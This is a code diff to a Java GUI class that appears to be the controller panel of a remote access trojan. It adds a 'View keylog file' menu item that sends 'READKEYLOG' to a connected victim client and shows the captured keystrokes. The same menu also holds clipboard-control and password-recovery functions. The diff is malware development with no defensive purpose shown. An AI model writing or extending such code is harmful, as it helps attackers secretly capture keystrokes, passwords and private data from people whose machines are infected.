@@ -193,6 +193,24 @@ class IPContextMenu implements Repository {
             stage.show();
         });
 
+        MenuItem si9 = new MenuItem("View keylog file");
+        si9.setOnAction(event -> {
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    clientObject.clientCommunicate("READKEYLOG");
+                    Stage stage = new Stage();
+                    stage.initStyle(StageStyle.UNDECORATED);
+                    stage.setMinWidth(300);
+                    stage.setMinHeight(300);
+                    stage.setScene(new Scene(new KeyloggerView().getKeyloggerView(stage), 400, 400));
+                    stage.show();
+                } catch (IOException ioe){
+                    new AlertView().showErrorAlert("Unable to communicate with client.");
+                    ioe.printStackTrace();
+                }
+            }
+        });
+
         // Clipboard junk
         Menu clip = new Menu("Clipboard Functions \u25B6");
         MenuItem setClipboard = new MenuItem("Set Clipboard");
@@ -373,7 +391,7 @@ class IPContextMenu implements Repository {
             }
         });
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si8, clip, pwdRecovery, misc, update);
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si8, si9, clip, pwdRecovery, misc, update);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
